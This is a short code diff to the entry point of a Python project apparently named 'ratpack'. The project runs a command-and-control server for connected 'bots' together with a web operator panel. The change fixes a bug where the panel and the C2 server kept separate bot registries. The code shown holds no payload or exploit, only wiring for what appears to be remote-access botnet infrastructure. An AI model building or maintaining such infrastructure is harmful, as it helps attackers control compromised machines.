@@ -14,6 +14,7 @@ import uvicorn
 
 from . import config as cfgmod
 from .bots import C2Server, ControlServer, Heartbeat, log
+from .panel import _panel_server
 
 
 def main():
@@ -28,6 +29,11 @@ def main():
 
     server = C2Server(cfg, cfg["secret"])
 
+    # The panel and the C2 must share one bot registry, otherwise the panel
+    # would show an empty list while the C2 has bots connected.
+    server.registry = _panel_server.registry
+    _panel_server.c2 = server
+
     # The control channel lives on the C2 port + 1, on loopback only.
     control = ControlServer(server, "127.0.0.1", int(c2.get("port", 8777)) + 1)
     control.start()
@@ -40,7 +46,12 @@ def main():
     print(f"  setting.json: http://{web.get('host')}:{web.get('port')}/setting.json")
     print(f"  login: {web.get('username')}")
 
-    uvicorn.run("ratpack.panel:app", host=web.get("host", "127.0.0.1"),
+    # The app object is passed directly instead of the import string
+    # "ratpack.panel:app": uvicorn would import the module a second time and
+    # that copy would get its own bot registry, so the panel would show an
+    # empty list while the C2 had bots connected.
+    from .panel import app
+    uvicorn.run(app, host=web.get("host", "127.0.0.1"),
                 port=int(web.get("port", 8080)), log_level="info")
     return 0
 
